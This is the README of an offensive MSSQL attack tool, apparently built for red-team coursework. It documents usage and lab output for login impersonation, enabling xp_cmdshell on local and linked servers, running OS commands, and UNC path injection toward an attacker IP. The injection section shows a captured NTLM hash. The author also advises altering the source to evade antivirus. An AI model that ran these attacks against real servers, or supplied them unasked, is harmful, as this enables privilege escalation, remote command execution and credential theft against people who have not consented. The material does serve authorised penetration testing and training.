# MSSQL AttackerV2
###### By Rikunj Sindhwad
This tool is intended to carry out well-known attacks on MSSQL database servers. The tool was created during the OSEP course, and credit must be given to Offensive Security because some code snippets and ideas were lifted from the course. The tool is open source and can be used by anyone to carry out red team operations. The tool is undetected until it is developed and may be detectable by antivirus software in the future. Consider changing the source code before use.

- If you like the concept/effort, follow me on social media for a long term connection [LinkedIn](https://www.linkedin.com/in/rikunj/).
- You can contact me via [telegram](https://t.me/R0B077) if you have any suggestions||improvements||bugs.

#### Guide

> Help Menu
```c
[*] MSSQL Attacker - V2 by Rikunj Sindhwad [CLI MODE] [*]
                HELP MENU
 USAGE: binary.exe cli -a AttackName -t DatabaseServer -d DatabaseName

 -a                     Attack Mode [Add -a to get list of attacks]
 -t                     Target Server
 -d                     Target DatabaseName [Optional]
 -u                     Target Username [Optional]
 -p                     Target Password [Optional]
 -dbo                   DatabaseNmae for DBO impersonation [Optional]
 -ls                    Linked MSSQLServer Name
 -l                     Attacker IP for UNC Path Injection
 -query                 Custom SQL Query
 -iuser                 UserName to impersonate
 -impersonate           ImpersonateSA before execution of any attack
 -impersonateSA         ImpersonateSA before execution of any attack
 -impersonateDBO        ImpersonateDBO before execution of any attack
[*] MSSQL Attacker - V2 by Rikunj Sindhwad [GUI MODE] [*]
                HELP MENU
 USAGE: binary.exe GUI DatabaseServer [Optional] DatabaseName [Optional] Username [Optional] Password
 USAGE: binary.exe GUI dc01.corp1.com masters SA SecretPassword
```

> Attack  Menu

- [ ] C-GUI 
```c
                                [*] MSSQL Attacker V2 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] Impersonate                          [5] Impersonate DBO             [6] Toggle xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] Toggle LinkedServer xp_cmdshell     [11] LinkedServer xp_cmdshell  [12] Custom SQL Query
[0] Exit Program

[INPUT] Enter Value:

```
- [ ] CLI
```powershell
Z:\>MSSQLAttacker.exe cli -a
[-] Invelid AttackName
[+] Available Attacks
        checkimpersonate
        checklinkedservers
        checklinkedserverVersion
        uncpathinject
        getinfo
        togglecmdshell
        togglelinkedcmdshell
        execlinkedcmd
        execcmd
        runCustomQuery
```


#### Check login user and sysadmin privileges.
The sysadmin privilege enables extra functionalities which could be used to gain access over database server through OS command execution.

- [ ] CLI

```powershell
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a getinfo
[+] Auth success!
[+] User: ROBENSIVELABS\sqluser
[-] User is NOT a member of sysadmin role

```

- [ ] C-GUI 

```powershell
[INPUT] Enter Value: 1
[+] User: ROBENSIVELABS\rob
[+] User is a member of sysadmin role
```

#### Check if any user can be impersonated.
 Impersonation privilege across users will often allows to perform privileged tasks over the DB server such as enabling xp_cmdshell and many more.

- [ ] CLI

```powershell
PS C:\Tools> whoami
robensivelabs\sqluser
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a checkimpersonate
[+] Auth success!
[+] Impersonatable Users:
ROBENSIVELABS\rob

```

- [ ] C-GUI 

```powershell
[INPUT] Enter Value: 3
[+] Logins that can be impersonated: ROBENSIVELABS\rob
```


#### Check Linked MSSQL Servers.

Often linked servers are configured with sysadmin privileges. through which execution of OS command can be performed over the linked server.
- [ ] CLI
```powershell
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a checklinkedservers
[+] Auth success!
[+] Linked Servers:
DBSRV01\SQLEXPRESS
DC01

```

- [ ] C-GUI 

```

[INPUT] Enter Value: 8
[+] Linked SQL server: DBSRV01\SQLEXPRESS
[+] Linked SQL server: DC01
```

#### Perform UNC Path injection attack.
The UNC Path Injection attack is well known attack performed over the MSSQL database servers. The attack send `SMB` connection to the Victim listener which can be used to perform further actions such as ntlmrelay or cracking hash to gain access over the system with database user.

- [ ] CLI
```batch
Z:\>MSSQLAttackerV2-x64.exe cli -t dc01.robensivelabs.local -d master -a uncpathinject -l 192.168.49.109
[+] Auth success!
[+] Request Sent to: 192.168.XX.YYY

```

- [ ] C-GUI 

```

[INPUT] Enter Value: 2
Enter Attacker Machine IP: 192.168.00.000
[+] Request Sent to: 192.168.00.000
```

>SMBSERVER

```c
# impacket-smbserver -smb2support share . 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.00.0,61898)
[*] AUTHENTICATE_MESSAGE (ROBENSIVELABS\sqlsvc,DC01)
[*] User DC01\sqlsvc authenticated successfully
[*] sqlsvc::ROBENSIVELABS:aaaaaaaaaaaaaaaa:fd06f750293156da55e662fed63e90d3:0101000000000000002a6de9be95d8017a4bcabd0f4e7ea100000000010010004c007900560044004e00610046007300030010004c007900560044004e006100460073000200100056005000440075006100550076007100040010005600500044007500610055007600710007000800002a6de9be95d80106000400020000000800300030000000000000000000000000300000d5b59bbba756823ee684e0822332d904a879a20075e09a14f9207e27158c27aa0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340039002e003100300039000000000000000000
[*] Closing down connection (192.168.00.0,61898)
```


#### Check version of the Linked Servers.
The feature will just identifiy linked server version through banner grabbing which could be very helpful when privileges are low however, version is vulnerable to known exploits.

- [ ] CLI
```powershell
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a checklinkedserverVersion -ls dc01
[+] Auth success!
[+] Linked Server: dc01
Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
        Oct 20 2015 15:36:27
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
```

- [ ] C-GUI 

```powershell
[INPUT] Enter Value: 9
Enter Linked Server: APPSRV01
[+] Linked Server: dc01
Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
        Oct 20 2015 15:36:27
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
```

#### Toggle xp_cmdshell (Local Server).
When `sysadmin` privilege is enabled, this feature will reconfigure settings to enable xp_cmdshell which is the easiest way to execute OS commands.

- [ ] CLI
```powershell
#Fails as current user don't have sysadmin privileges
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a togglecmdshell
[+] Auth success!
[-] Value In Use: 0
[-] xp_cmdshell is disabled
[-] xp_cmdshell toggle fail! || Missing Privileges

#Used -impersonate to enable|toggle impersonation to gain sysadmin priv.
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "robensivelabs\rob" -a togglecmdshell
[+] Auth success!
[+] Impersonation Success [robensivelabs\rob]
[-] Value In Use: 0
[-] xp_cmdshell is disabled0
[+] Value In Use: 1
[+] xp_cmdshell is enabled
[+] xp_cmdshell toggled
PS C:\Tools>

PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "robensivelabs\rob" -a togglecmdshell
[+] Auth success!
[-] Value In Use: 1
[-] xp_cmdshell is enabled
[+] Value In Use: 0
[+] xp_cmdshell is disabled
[+] xp_cmdshell toggled

#Used -impersonateDBO to togle impersonation to gain sysadmin priv.

Z:\>.\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a enablecmdshell -impersonateDBO -dbo sqladmindb
[+] Auth success!
[-] Value In Use: 0
[-] xp_cmdshell is disabled
[+] Value In Use: 1
[+] xp_cmdshell is enabled
[+] xp_cmdshell toggled
```

- [ ] C-GUI 

```bash
#Through DBO impersonation
[INPUT] Enter Value: 5
[+] Found Trustworthy Database
[+] Impersonation As DBO Success

[INPUT] Enter Value: 6
[+] Value In Use: 1
[+] xp_cmdshell is enabled
[-] Value In Use: 0
[-] xp_cmdshell is disabled0
[+] xp_cmdshell toggled

#Through SA impersonation
INPUT] Enter Value: 4
[+] Impersonatable Users: sa
[+] Impersonation Success
[INPUT] Enter Value: 6
[+] Value In Use: 1
[+] xp_cmdshell is enabled
[-] Value In Use: 0
[-] xp_cmdshell is disabled0
[+] xp_cmdshell toggled

#Through Other User impersonation
[INPUT] Enter Value: 3
[+] Impersonatable Users:
ROBENSIVELABS\rob
[INPUT] Enter Value: 4
Enter UserName to impersonate:ROBENSIVELABS\rob
[+] Impersonation Success [ROBENSIVELABS\rob]
[INPUT] Enter Value: 1
[+] User: ROBENSIVELABS\rob
[INPUT] Enter Value: 6
[-] Value In Use: 0
[-] xp_cmdshell is disabled0
[+] Value In Use: 1
[+] xp_cmdshell is enabled

```


#### Toggle xp_cmdshell (Linked Server).

The linkedServer might have sysadmin privilege and not the connected database server. This feature toggle xp_cmdshell over linkedDBServers.


- [ ] CLI
```batch
PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "ROBENSIVELABS\rob" -a togglelinkedcmdshell -ls dc01
[+] Auth success!
[+] Impersonation Success [ROBENSIVELABS\rob]
[+] Linked Server: dc01  Value In Use: 1
[-] Linked Server: dc01  Value In Use: 0
[+] Linked xp_cmdshell toggled
```

- [ ] C-GUI

```

[INPUT] Enter Value: 10
Enter Linked Server: dc01
[-] Linked Server: dc01  Value In Use: 0
[+] Linked Server: dc01  Value In Use: 1
[+] Linked xp_cmdshell toggled
```

#### Command Execution Local (When xp_cmdshell enabled).

- [ ] CLI
```bash
# Fails when no priv
PS C:\Tools>  .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a execcmd -c 'whoami'
[+] Auth success!
[+] Value In Use: 1
[+] xp_cmdshell is enabled
[-] Missing Privileges || Ex.Sysadmin

# with dual impersonation rob ==> impersonateSA
PS C:\Tools>  .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "ROBENSIVELABS\rob" -impersonateSA -a execcmd -c 'whoami'
[+] Auth success!
[+] Impersonation Success [ROBENSIVELABS\rob]
[+] Impersonation Success [SA]
[+] Value In Use: 1
[+] xp_cmdshell is enabled
nt service\mssql$sqlexpress

# with impersonateDBO
Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd  -impersonateDBO -dbo msdb -c ipconfig
[+] Auth success!
[+] Found Trustworthy Database
[+] Impersonation As DBO Success
[+] Value In Use: 1
[+] xp_cmdshell is enabled

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.XX.Y
   Subnet Mask . . . . . . . . . . . : 255.255.XXX.Y
   Default Gateway . . . . . . . . . : 192.168.XXX.YY

```

- [ ] C-GUI  when `exit` typed it will close the connection and move to main.

```powershell

[INPUT] Enter Value: 7
[+] Value In Use: 1
[+] xp_cmdshell is enabled
Enter Command: whoami
nt service\mssql$sqlexpress

Enter Command: hostname
DBSRV01

Enter Command:
```

#### Blind Command Execution LinkedServer (When xp_cmdshell enabled).

Once xp_cmdshell is enabled over the linkedServer this feature enables `blind` OS command execution against the same. 

- [ ] CLI
```c
Z:\>MSSQLAttacker.exe cli -t dc01.robensivelabs.local -d master -a execlinkedcmd -ls dc01 -c "ping 192.168.XX.YY"
[+] Auth success!
[+] Linked Server: appsrv01      Value In Use: 1
Command Executed
```
- [ ] C-GUI
```c
[INPUT] Enter Value: 11
Enter Linked Server: DC01
[+] Linked Server: DC01  Value In Use: 1
Enter Command: ping 192.168.179.133
Command Executed
```
#### Custom Query Execution.

- [ ] CLI
```c
 .\MSSQLAttackerV2.exe cli  -t dc01 -a runCustomQuery -query 'select @@VERSION'
[+] Auth success!
select @@VERSION;
Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
        Oct 20 2015 15:36:27
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
```
- [ ] C-GUI
```c
[INPUT] Enter Value: 12
Query> select @@VERSION
Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
        Oct 20 2015 15:36:27
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
```
